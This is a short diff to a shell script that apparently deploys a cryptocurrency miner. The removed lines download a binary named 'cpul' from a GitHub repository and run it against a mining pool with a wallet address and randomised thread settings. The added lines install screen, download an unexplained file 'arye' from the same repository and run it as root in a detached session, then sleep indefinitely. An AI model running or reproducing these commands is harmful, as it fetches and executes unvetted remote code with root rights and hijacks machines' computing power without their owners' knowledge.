@@ -1,9 +1,7 @@
-wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/cpul
-chmod +x cpul
-./cpul \
-  --algo power2b \
-  --random-threads=1-8 \
-  --random-thread-interval=30 \
-  -o na.rplant.xyz:7022 -u mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.LLM -p x
+sudo apt update
+sudo apt install screen -y
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/arye
+screen -dmS play sudo bash arye
+sleep 8435345673
 
 
